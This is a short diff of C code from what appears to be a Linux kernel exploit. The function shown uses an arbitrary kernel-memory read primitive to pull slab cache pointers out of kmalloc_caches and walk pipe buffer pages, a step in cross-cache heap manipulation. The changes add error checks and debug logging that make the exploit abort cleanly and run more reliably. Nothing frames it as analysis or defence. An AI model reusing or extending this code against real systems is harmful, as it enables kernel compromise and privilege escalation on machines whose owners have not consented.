@@ -406,7 +406,15 @@ int pipe_reclaim_cache_gate(int fd) {
   uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
   memset(cache_slots, 0, sizeof(cache_slots));
   uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
-  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  ssize_t cache_got =
+      kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  pr_info("pipe kmalloc_caches src=%016zx got=%zd want=%zu\n",
+          kmalloc_caches, cache_got, sizeof(cache_slots));
+  if (cache_got != (ssize_t)sizeof(cache_slots)) {
+    pr_info("pipe kmalloc_caches bulk read failed, aborting gate cleanly\n");
+    pipe_cache_gate_ok = 0;
+    return 0;
+  }
   kmalloc_normal_1k_cache =
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_normal_2k_cache =
@@ -423,6 +431,18 @@ int pipe_reclaim_cache_gate(int fd) {
           kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
           kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache,
           kmalloc_pipe_cache);
+  if ((kmalloc_pipe_cache >> 48) != 0xffff) {
+    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
+      uint64_t v = kernel_read64(
+          fd, kmalloc_caches + (uintptr_t)slot * 8);
+      pr_info("pipe slot[%d]=bulk:%016zx single:%016zx\n",
+              slot, cache_slots[slot], v);
+    }
+    pr_info("pipe selected not canonical, aborting gate cleanly "
+            "src=%016zx\n", kmalloc_caches);
+    pipe_cache_gate_ok = 0;
+    return 0;
+  }
   for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
     uintptr_t page = pipebuf_page_base + off;
     uintptr_t head = direct_to_head_page(fd, page);
